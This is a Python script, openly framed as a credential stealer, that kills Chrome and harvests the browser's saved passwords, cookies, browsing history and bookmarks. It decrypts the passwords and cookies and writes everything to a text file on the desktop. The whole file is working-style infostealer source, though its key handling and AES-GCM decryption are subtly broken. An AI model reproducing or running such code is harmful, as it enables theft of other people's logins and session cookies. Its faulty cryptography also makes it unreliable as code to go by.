import os
import sqlite3
import json
import base64
import shutil
import subprocess
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

# CONFIGURATION
output_file = r"C:\Users\Admin\OneDrive\Desktop\ALL_CHROME_DATA.txt"
chrome_data_dir = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default')

# KILL CHROME PROCESSES
subprocess.call(['taskkill', '/F', '/IM', 'chrome.exe'], stderr=subprocess.DEVNULL)

# GET DECRYPTION KEY
def get_chrome_key():
    local_state = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Local State')
    with open(local_state, 'r') as f:
        encrypted_key = json.load(f)['os_crypt']['encrypted_key']
    return base64.b64decode(encrypted_key)[5:]

# DECRYPT DATA
def chrome_decrypt(encrypted):
    if encrypted[:3] == b'v10':
        try:
            cipher = Cipher(algorithms.AES(get_chrome_key()), modes.GCM(encrypted[3:15], encrypted[15:-16]), 
                           backend=None)
            decryptor = cipher.decryptor()
            return decryptor.update(encrypted[15:-16]) + decryptor.finalize()
        except:
            return b'DECRYPT_FAIL'
    else:
        # Legacy DPAPI decryption would go here (not implemented)
        return b'UNSUPPORTED_ENCRYPTION'

# STEAL ALL DATA FUNCTION
def steal_all_data():
    results = []
    
    # 1. PASSWORDS
    try:
        passwd_db = os.path.join(chrome_data_dir, 'Login Data')
        temp_db = "temp_login_data"
        shutil.copy2(passwd_db, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        results.append("\n===== PASSWORDS =====")
        for url, user, pwd in cursor.fetchall():
            decrypted = chrome_decrypt(pwd)
            results.append(f"URL: {url}\nUser: {user}\nPassword: {decrypted.decode('utf-8', 'ignore')}\n")
        conn.close()
        os.remove(temp_db)
    except Exception as e:
        results.append(f"\nPASSWORD ERROR: {str(e)}")
    
    # 2. COOKIES
    try:
        cookie_db = os.path.join(chrome_data_dir, 'Cookies')
        temp_db = "temp_cookies"
        shutil.copy2(cookie_db, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        
        results.append("\n===== COOKIES =====")
        for host, name, val in cursor.fetchall():
            decrypted = chrome_decrypt(val)
            results.append(f"Domain: {host}\nName: {name}\nValue: {decrypted.decode('utf-8', 'ignore')}\n")
        conn.close()
        os.remove(temp_db)
    except Exception as e:
        results.append(f"\nCOOKIE ERROR: {str(e)}")
    
    # 3. HISTORY
    try:
        history_db = os.path.join(chrome_data_dir, 'History')
        temp_db = "temp_history"
        shutil.copy2(history_db, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, visit_count FROM urls")
        
        results.append("\n===== BROWSING HISTORY =====")
        for url, title, count in cursor.fetchall():
            results.append(f"URL: {url}\nTitle: {title}\nVisits: {count}\n")
        conn.close()
        os.remove(temp_db)
    except Exception as e:
        results.append(f"\nHISTORY ERROR: {str(e)}")
    
    # 4. BOOKMARKS
    try:
        bookmarks_file = os.path.join(chrome_data_dir, 'Bookmarks')
        with open(bookmarks_file, 'r', encoding='utf-8') as f:
            bookmarks = json.load(f)
        
        def parse_bookmarks(node):
            items = []
            if 'children' in node:
                for child in node['children']:
                    items.extend(parse_bookmarks(child))
            elif 'url' in node:
                items.append(f"Title: {node['name']}\nURL: {node['url']}\n")
            return items
        
        results.append("\n===== BOOKMARKS =====")
        results.extend(parse_bookmarks(bookmarks['roots']['bookmark_bar']))
    except Exception as e:
        results.append(f"\nBOOKMARK ERROR: {str(e)}")
    
    return results

# MAIN EXECUTION
with open(output_file, 'w', encoding='utf-8') as f:
    f.write("\n".join(steal_all_data()))

# CLEANUP
if os.path.exists("temp_login_data"): os.remove("temp_login_data")
if os.path.exists("temp_cookies"): os.remove("temp_cookies")
if os.path.exists("temp_history"): os.remove("temp_history")